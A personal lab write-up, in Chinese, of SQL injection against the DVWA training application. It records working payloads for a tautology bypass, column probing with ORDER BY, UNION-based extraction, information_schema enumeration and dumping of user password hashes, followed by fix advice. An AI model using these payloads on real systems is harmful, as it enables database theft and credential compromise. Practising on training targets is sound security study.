# DVWA - SQL Injection 实战记录

## 1. 漏洞发现
- 输入 `1`，回显正常用户信息。
- 输入 `1' OR '1'='1`，成功绕过查询条件，回显了数据库中所有用户。

## 2. UNION 联合查询（推演过程）
- **尝试直接注入**：`1' UNION SELECT 1, user(), database() #` 失败（报错列数不一致）。
- **探列**：依次输入 `ORDER BY 1` 和 `ORDER BY 2` 均正常，`ORDER BY 3` 报错 `Unknown column '3'`，推断原查询为 **2列**。
- **精准利用**：`1' UNION SELECT user(), database() #` 成功回显 `app@localhost` 和 `dvwa`。

## 3. 数据脱库
- **查表名**：`1' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema='dvwa' #`
- **拖取账号密码**：`1' UNION SELECT user, password FROM users #`
- **结果**：拿到了 MD5 加密的密码散列值（如 `5f4dcc3b5aa765d61d8327deb882cf99`），通过查询 MD5 反查网站，成功还原明文。

## 4. 修复建议
- **参数化查询（预编译）**：使用 `PDO` 或 `mysqli` 的 `prepare` 语句，将用户输入作为参数传入，而不是拼接。
- **输入转义**：如果非要用拼接，使用 `mysqli_real_escape_string()` 对单引号等特殊字符进行转义。

## 5. 心得感悟
以前觉得 SQL 注入就是随便输个 `' OR 1=1` 碰运气。这次通过 `ORDER BY` 探列，再到利用 `information_schema` 库查表、查字段，最后拖出账号密码。这才是真正的“注入”。同时也深刻认识到了 `information_schema` 这种系统元数据表在黑客眼中的威力。
这次能成功拖库，是因为了解了 [[SQL语法基础]] 和 [[数据库原理]] 